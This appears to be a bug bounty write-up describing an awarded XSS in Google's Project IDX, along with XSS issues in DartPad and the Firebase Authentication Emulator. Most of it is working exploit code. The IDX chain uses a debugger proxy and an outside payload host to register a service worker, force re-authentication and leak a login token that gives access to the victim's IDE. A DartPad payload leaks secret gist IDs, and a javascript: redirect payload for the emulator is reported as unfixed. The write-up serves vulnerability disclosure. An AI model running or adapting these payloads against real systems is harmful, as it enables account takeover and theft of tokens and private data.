---
title: idx.google.com XSS (Awarded $3133.70)
---

This is a hosted development environment called Project IDX based on [Visual Studio Code](https://github.com/microsoft/vscode) like [Google Cloud Shell](https://cloud.google.com/shell/)

Feature being abused: <https://developers.google.com/idx/guides/debug-in-idx#chrome-devtools>
Its based of the Chii open source project <https://github.com/liriliri/chii/commit/0002b761737f450fe070699b6fec284d6e1e91e9>

- Create a project as simple html.  
- Once loaded, Take the `ID` from an iframe in the format `https://9000-monospace-<ID>.cloudworkstations.dev` (In a real attack this could be leaked from the network)
- Run the following from any website replacing `ID` with your own ID.

```js
// Vulnerable debugger proxy (Runs any js code you want, Fetch as the victims server)
let target = 'https://8282-monospace-<ID>.cloudworkstations.dev/proxy?url=';

// Link to our service worker
let proxy = new URL('https://terjanq.me/xss.php');
proxy.searchParams.set('ct', 'application/javascript');
proxyPayload = `
self.addEventListener("fetch", (event) => {
 let url = event.request.url;
 // Leak token from redirect since its a httponly cookie
  // Authentication is done by:
 // Redirecting the user to https://ssh.cloud.google.com/devshell/gateway/oauth?state=<value> (Cross-site, COOP, embed protection)
 // https://<PORT>-idx-<ID>.cloudworkstations.dev/_workstation/login?redirect=<value> this sets a cookie then redirects back.
 if (url.includes("_workstation/login")) {
  console.info('🎉 Leaked token: '+url);
 }
});
`;
proxy.searchParams.set('html', proxyPayload);

// Link to force a re-authenticate
let reauth = new URL('https://terjanq.me/xss.php');
reauth.searchParams.set('h[Clear-Site-Data]', '"cookies"');
reauthPayload = `
setTimeout(() => { location.href=location.origin }, 3000);
`;
reauth.searchParams.set('js', reauthPayload);

// Link to create service work
let setup = new URL('https://terjanq.me/xss.php');
setupPayload = `
navigator.serviceWorker.register("${target+encodeURIComponent(proxy.href)}");
setTimeout(() => { location.href="${target+encodeURIComponent(reauth.href)}" }, 3000);
`;
setup.searchParams.set('js', setupPayload);

// Do the stuff
location = target + encodeURIComponent(setup.href);
```
- In the console you should see a message that says "leaked token" of the format `https://8282-monospace-<ID>.cloudworkstations.dev/_workstation/login?redirect=<secret>` in a new browser go to that URL and you will be logged in to the debugger.
- You will have got a `WorkstaionJwt` from that by changing the domain of this cookie for example to `80-monospace-<ID>.cloudworkstations.dev` you can login to the IDE!

# Pointless XSS section :)

## DartPad XSS (dartpad.dev)
This is an editor for Dart code.

By abusing the XSS in `frame.html` it allowed putting interactive content on other people's websites
that use the code embed via a popup window reference which is a spoofing risk especially if providing API keys on that site is expected behavior also It's leaking injected snippets or secret gists of that site.
```js
// Please click, Opening a victim popup needs user activation
onclick = () => {
    let frame = document.createElement('iframe');
    frame.src = 'https://dartpad.dev/frame.html';
    document.body.appendChild(frame);

    payload = `
 // XSS running on the dartpad.dev origin (instead of null)
 let win = open('https://terjanq.me/xss.php?html=%3Ciframe%20src=%22https://dartpad.dev/?id=5c0e154dd50af4a9ac856908061291bc?theme=light%22%3E%3C/iframe%3E');
 setTimeout(() => {
  // Leak the secret gist ID of a cross-site embed
  alert('Leaked: ' + win[0].location.search);
 }, 2000);
`;

    frame.onload = () => {
        frame.contentWindow.postMessage({
            command: 'execute',
            js: payload
        }, '*');
    };

};

```
This was fixed in <https://github.com/dart-lang/dart-pad/pull/2943> by enforcing the`null` origin sandbox.

## Firebase Authentication Emulator XSS (localhost) Not fixed
This is a local test environment for Firebase.

<https://github.com/firebase/firebase-tools/blob/80964d04ee34b204116be6139e76ad96f427a06d/src/emula
tor/auth/widget_ui.ts#L65>
Navigates to a `javascript:` path provided in the `redirectUrl` URL parameter for example, `/emulator/auth/handler?apiKey=1&providerId=1&redirectUrl=javascript:alert(origin)&appName=1`
Other emulator XSS, <https://github.com/firebase/firebase-tools/blob/96fe35f4a38736f16a183c76a53112a7b86b2487/src/emulator/functionsEmulator.ts#L1554-L1556>
